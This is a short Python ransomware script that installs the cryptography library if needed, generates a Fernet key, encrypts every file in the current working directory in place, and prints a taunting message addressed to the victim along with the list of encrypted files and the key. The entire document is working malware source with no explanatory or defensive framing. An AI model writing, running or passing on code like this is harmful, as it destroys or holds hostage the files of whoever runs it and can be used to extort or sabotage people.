import subprocess
import sys
import os
try:
    from cryptography.fernet import Fernet
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "cryptography"])
    from cryptography.fernet import Fernet

key = Fernet.generate_key()
files = []

directory = os.getcwd()

for i in os.listdir():

    full_path = os.path.join(directory, i)

    if os.path.isdir(full_path):
        continue
    else:
        files.append(i)
    with open(i, "rb") as f:
        things = f.read()

        f = Fernet(key)
        encrypted = f.encrypt(things)
    with open(i, "wb") as f:
        f.write(encrypted)
print(f'Dear moron.\n You ran a ransomware virus on your machine.\n All of your files are encrypted.\n Good luck!')
print(f'Encrypted files: {files}')
print(f"{key}")
